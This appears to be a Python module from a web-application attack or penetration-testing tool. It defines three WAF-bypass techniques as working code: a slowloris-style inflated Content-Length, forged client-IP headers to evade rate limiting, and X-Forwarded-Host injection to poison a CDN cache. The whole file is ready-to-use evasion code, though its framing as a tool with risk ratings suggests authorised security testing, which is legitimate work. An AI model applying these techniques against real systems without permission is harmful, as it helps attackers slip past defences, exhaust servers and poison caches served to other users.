# Copyright (c) 2026 M. TENDENG
# Licensed under the MIT License. See LICENSE file for details.

"""
Stratégies de bypass WAF par timing/rate (3 stratégies).

slowloris: Content-Length gonflé pour tenter de maintenir la connexion ouverte.
rate_limit_evasion: Headers IP forgés pour contourner le rate limiting par IP.
cache_poisoning: Headers de cache pour empoisonner le CDN front du WAF.
"""
from __future__ import annotations

import random
from typing import Any

from hdwp.core.model.schemas import NormalizedRequest
from hdwp.core.payloads.waf_bypass.bypass_registry import BypassResult, BypassStrategy


def _slowloris(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    fake_content_length: int = params.get("fake_content_length", 1_000_000)
    body_bytes = b""
    if isinstance(request.body, str):
        body_bytes = request.body.encode()
    elif isinstance(request.body, bytes):
        body_bytes = request.body

    new_headers = dict(request.headers)
    new_headers["Content-Length"] = str(fake_content_length)

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers}),
        raw_override=body_bytes,
    )


def _rate_limit_evasion(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    fake_ip = ".".join(str(random.randint(1, 254)) for _ in range(4))
    new_headers = dict(request.headers)
    new_headers["X-Forwarded-For"] = f"{fake_ip}, 127.0.0.1"
    new_headers["X-Real-IP"] = fake_ip
    new_headers["X-Originating-IP"] = fake_ip
    new_headers["X-Remote-IP"] = fake_ip
    new_headers["X-Remote-Addr"] = fake_ip

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers}),
    )


def _cache_poisoning(request: NormalizedRequest, params: dict[str, Any]) -> BypassResult:
    poison_host: str = params.get("poison_host", "hdwp-bypass.invalid")
    new_headers = dict(request.headers)
    new_headers["X-Forwarded-Host"] = poison_host
    new_headers["X-Host"] = poison_host
    new_headers["X-Forwarded-Scheme"] = "https"
    new_headers["X-Original-URL"] = request.url
    new_headers["Cache-Control"] = "no-transform"

    return BypassResult(
        request=request.model_copy(update={"headers": new_headers}),
    )


TIMING_STRATEGIES: list[BypassStrategy] = [
    BypassStrategy(
        name="slowloris",
        category="timing",
        apply=_slowloris,
        description="Content-Length gonflé pour maintenir la connexion ouverte",
        risk_level="high",
        requires_special_execution=True,
    ),
    BypassStrategy(
        name="rate_limit_evasion",
        category="timing",
        apply=_rate_limit_evasion,
        description="5 headers IP forgés aléatoires pour contourner le rate limiting",
        risk_level="medium",
    ),
    BypassStrategy(
        name="cache_poisoning",
        category="timing",
        apply=_cache_poisoning,
        description="Headers X-Forwarded-Host/X-Host pour empoisonner le cache CDN",
        risk_level="medium",
    ),
]
